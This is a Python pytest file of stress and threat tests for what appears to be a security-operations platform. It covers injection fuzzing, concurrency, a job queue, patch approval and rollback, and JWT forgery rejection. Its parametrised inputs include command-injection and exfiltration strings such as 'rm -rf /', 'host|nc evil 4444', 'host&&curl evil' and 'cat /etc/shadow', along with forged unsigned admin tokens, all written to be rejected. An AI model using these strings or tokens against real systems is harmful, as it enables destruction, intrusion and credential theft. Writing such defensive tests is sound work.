"""Phase 2 — stress, threat, and failure-mode tests (20 cases).

Adversarial input fuzzing, concurrency / race conditions (the GAP-03 collision),
high-load quantum queue with back-pressure, sandbox-command injection defence,
patch rollback, envelope-tamper detection, and JWT algorithm-confusion.
"""
from __future__ import annotations

import asyncio
import uuid

import jwt
import pytest

from jakal_core import auth, config
from jakal_core.crypto.envelope import unwrap_key, wrap_key
from jakal_core.errors import AuthenticationError, ConflictError, NotFoundError
from jakal_core.models import (
    JobStatus,
    RiskLevel,
    TaskStatus,
    UnifiedSecurityEvent,
)
from jakal_core.security.sanitize import sanitize_target, validate_sandbox_command
from jakal_core.services.ares_service import AresService
from jakal_core.services.quantum_service import drain_queue

pytestmark = pytest.mark.asyncio


# ── Malformed input / fuzzing (5) ───────────────────────────────────────────
@pytest.mark.parametrize(
    "bad",
    ["10.0.0.1; rm -rf /", "$(whoami)", "`id`", "host|nc evil 4444", "../../etc/passwd",
     "a" * 300, "", "   ", "10.0.0.1\nDROP TABLE", "host&&curl evil"],
)
async def test_21_sanitize_target_rejects_injection(bad):
    with pytest.raises(ValueError):
        sanitize_target(bad)


async def test_22_sanitize_target_accepts_legitimate():
    for good in ["10.0.0.5", "host.example.com", "192.168.1.0/24", "[2001:db8::1]", "svc-01_prod"]:
        assert sanitize_target(good) == good


@pytest.mark.parametrize(
    "cmd", ["ls; cat /etc/shadow", "id && whoami", "echo $(cat secret)", "sh -c 'x'", "a | b"]
)
async def test_23_sandbox_command_blocks_metachars(cmd):
    with pytest.raises(ValueError):
        validate_sandbox_command(cmd)


async def test_24_sandbox_command_allows_plain_argv():
    assert validate_sandbox_command("nmap -sV 10.0.0.5") == ["nmap", "-sV", "10.0.0.5"]


async def test_25_quantum_enqueue_rejects_absurd_shots(quantum):
    with pytest.raises(ValueError):
        await quantum.enqueue(circuit_name="grover", shots=10_000_000, submitted_by="op-alice")
    with pytest.raises(ValueError):
        await quantum.enqueue(circuit_name="grover", shots=0, submitted_by="op-alice")


# ── Concurrency / race conditions (5) — proves the GAP-03 collision is gone ──
async def test_26_concurrent_event_inserts_no_pk_collision(sessionmaker_):
    async def insert(i: int) -> uuid.UUID:
        async with sessionmaker_() as s:
            svc = AresService(s)
            ev = await svc.record_event(
                source_module=f"m{i}", threat_category="X", severity_score=0.1, raw_payload={"i": i}
            )
            await s.commit()
            return ev.event_id

    ids = await asyncio.gather(*(insert(i) for i in range(50)))
    assert len(set(ids)) == 50  # all unique, no "duplicate key id:1"


async def test_27_concurrent_key_registration_unique(sessionmaker_):
    from jakal_core.crypto.pqc import HybridSigner
    from jakal_core.services.crypto_service import CryptoService

    mk = config.get_settings().master_key

    async def reg() -> uuid.UUID:
        async with sessionmaker_() as s:
            key = await CryptoService(s, HybridSigner(), mk).register_key()
            await s.commit()
            return key.key_id

    ids = await asyncio.gather(*(reg() for _ in range(30)))
    assert len(set(ids)) == 30


async def test_28_double_decide_is_conflict_not_race(approvals, principals):
    req = await approvals.create_request(
        principals["operator"], action_type="patch", target="10.0.0.9",
        risk_level=RiskLevel.HIGH, summary="x", payload_detail={},
    )
    await approvals.decide(principals["approver"], req.request_id, approve=True)
    with pytest.raises(ConflictError):
        await approvals.decide(principals["approver"], req.request_id, approve=False)


async def test_29_all_rows_persisted_under_load(sessionmaker_):
    async def insert(i):
        async with sessionmaker_() as s:
            await AresService(s).record_event(
                source_module="load", threat_category="T", severity_score=0.5, raw_payload={"i": i}
            )
            await s.commit()

    await asyncio.gather(*(insert(i) for i in range(100)))
    async with sessionmaker_() as s:
        from sqlalchemy import func, select
        n = (await s.execute(select(func.count()).select_from(UnifiedSecurityEvent))).scalar_one()
    assert n == 100


async def test_30_matrix_summary_consistent_during_writes(sessionmaker_):
    async with sessionmaker_() as s:
        summary = await AresService(s).global_matrix_summary()
    assert set(["fabric_status", "threats_blocked_count", "active_agent_count"]).issubset(summary)


# ── High-load quantum queue with back-pressure (3) ──────────────────────────
async def test_31_queue_drains_all_jobs(quantum, sessionmaker_, session):
    for i in range(25):
        await quantum.enqueue(circuit_name="bell", shots=1024, submitted_by="op-alice")
    await session.commit()
    processed = await drain_queue(sessionmaker_, max_concurrency=4)
    assert processed == 25


async def test_32_drained_jobs_are_completed(quantum, sessionmaker_, session):
    await quantum.enqueue(circuit_name="qrng", shots=8, submitted_by="op-alice")
    await session.commit()
    await drain_queue(sessionmaker_, max_concurrency=2)
    from sqlalchemy import select

    from jakal_core.models import QuantumJob
    async with sessionmaker_() as s:
        job = (await s.execute(select(QuantumJob))).scalars().first()
    assert job.status is JobStatus.COMPLETED and job.result is not None


async def test_33_queue_depth_reflects_backlog(quantum, session):
    for _ in range(5):
        await quantum.enqueue(circuit_name="qaoa", shots=256, submitted_by="op-alice")
    await session.flush()
    assert await quantum.queue_depth() == 5


# ── Sandbox / patch failure modes (4) ───────────────────────────────────────
async def test_34_patch_blocked_until_approved(canvas, approvals, principals, session):
    req = await approvals.create_request(
        principals["operator"], action_type="patch", target="10.0.0.9",
        risk_level=RiskLevel.HIGH, summary="deploy", payload_detail={},
    )
    task = await canvas.create_task(
        principals["operator"], target_ip="10.0.0.9", patch_id="KB5001",
        approval_request_id=req.request_id,
    )
    with pytest.raises(ConflictError):
        await canvas.advance(task.task_id, 50)  # not approved yet
    await approvals.decide(principals["approver"], req.request_id, approve=True)
    advanced = await canvas.advance(task.task_id, 100)
    assert advanced.status is TaskStatus.COMPLETED


async def test_35_patch_rollback_records_reason(canvas, approvals, principals):
    req = await approvals.create_request(
        principals["operator"], action_type="patch", target="10.0.0.9",
        risk_level=RiskLevel.HIGH, summary="deploy", payload_detail={},
    )
    await approvals.decide(principals["approver"], req.request_id, approve=True)
    task = await canvas.create_task(
        principals["operator"], target_ip="10.0.0.9", patch_id="KB5001",
        approval_request_id=req.request_id,
    )
    await canvas.advance(task.task_id, 100)
    rolled = await canvas.rollback(task.task_id, reason="regression in auth module")
    assert rolled.status is TaskStatus.ROLLED_BACK
    assert rolled.deployment_progress == 0 and "regression" in rolled.rollback_reason


async def test_36_advance_terminal_task_conflicts(canvas, approvals, principals):
    req = await approvals.create_request(
        principals["operator"], action_type="patch", target="10.0.0.9",
        risk_level=RiskLevel.HIGH, summary="x", payload_detail={},
    )
    await approvals.decide(principals["approver"], req.request_id, approve=True)
    task = await canvas.create_task(
        principals["operator"], target_ip="10.0.0.9", patch_id="KB", approval_request_id=req.request_id
    )
    await canvas.rollback(task.task_id, reason="manual")
    with pytest.raises(ConflictError):
        await canvas.advance(task.task_id, 10)


async def test_37_advance_missing_task_raises(canvas):
    with pytest.raises(NotFoundError):
        await canvas.advance(uuid.uuid4(), 10)


# ── Crypto / auth attack surface (3) ────────────────────────────────────────
async def test_38_envelope_tamper_is_detected():
    mk = "master-abc"
    data = b"\x01" * 32
    wrapped, nonce = wrap_key(data, mk)
    tampered = bytes([wrapped[0] ^ 0xFF]) + wrapped[1:]
    with pytest.raises(Exception):  # AES-GCM auth tag failure
        unwrap_key(tampered, nonce, mk)


async def test_39_jwt_alg_none_confusion_rejected():
    s = config.get_settings()
    # Attacker forges an unsigned token claiming admin.
    forged = jwt.encode({"sub": "attacker", "role": "admin", "iss": s.jwt_issuer,
                         "aud": s.jwt_audience, "exp": 9999999999}, key="", algorithm="none")
    with pytest.raises(AuthenticationError):
        auth.decode_token(forged, s)


async def test_40_wrong_key_signature_rejected():
    s = config.get_settings()
    forged = jwt.encode(
        {"sub": "attacker", "role": "admin", "iss": s.jwt_issuer, "aud": s.jwt_audience,
         "exp": 9999999999}, key="the-wrong-secret", algorithm="HS256",
    )
    with pytest.raises(AuthenticationError):
        auth.decode_token(forged, s)
